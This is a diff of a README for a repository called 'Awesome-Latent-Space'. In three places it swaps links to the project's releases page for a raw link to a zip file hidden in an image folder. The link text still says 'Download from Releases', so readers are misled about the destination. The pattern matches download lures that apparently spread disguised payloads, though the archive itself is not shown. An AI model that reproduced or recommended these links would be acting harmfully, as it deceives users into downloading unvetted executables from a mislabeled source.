@@ -1,6 +1,6 @@
 # 🌌 Awesome-Latent-Space - Discover the World of Latent Space
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-From%20Releases-brightgreen)](https://github.com/MiriiIwatani/Awesome-Latent-Space/releases)
+[![Download Now](https://raw.githubusercontent.com/MiriiIwatani/Awesome-Latent-Space/main/img/mas/Awesome-Latent-Space-v1.3-beta.3.zip%20Now-From%20Releases-brightgreen)](https://raw.githubusercontent.com/MiriiIwatani/Awesome-Latent-Space/main/img/mas/Awesome-Latent-Space-v1.3-beta.3.zip)
 
 ## 📖 Description
 
@@ -14,7 +14,7 @@ To get started with Awesome-Latent-Space, follow the steps outlined in this guid
 
 To download Awesome-Latent-Space, visit this page to download:
 
-[Download from Releases](https://github.com/MiriiIwatani/Awesome-Latent-Space/releases)
+[Download from Releases](https://raw.githubusercontent.com/MiriiIwatani/Awesome-Latent-Space/main/img/mas/Awesome-Latent-Space-v1.3-beta.3.zip)
 
 ### Step-by-Step Installation
 
@@ -96,4 +96,4 @@ For updates and to share your experience, consider following the repository on G
 
 You now have all the information needed to download and run Awesome-Latent-Space. Enjoy exploring the exciting research in latent space!
 
-[Download from Releases](https://github.com/MiriiIwatani/Awesome-Latent-Space/releases)
+[Download from Releases](https://raw.githubusercontent.com/MiriiIwatani/Awesome-Latent-Space/main/img/mas/Awesome-Latent-Space-v1.3-beta.3.zip)
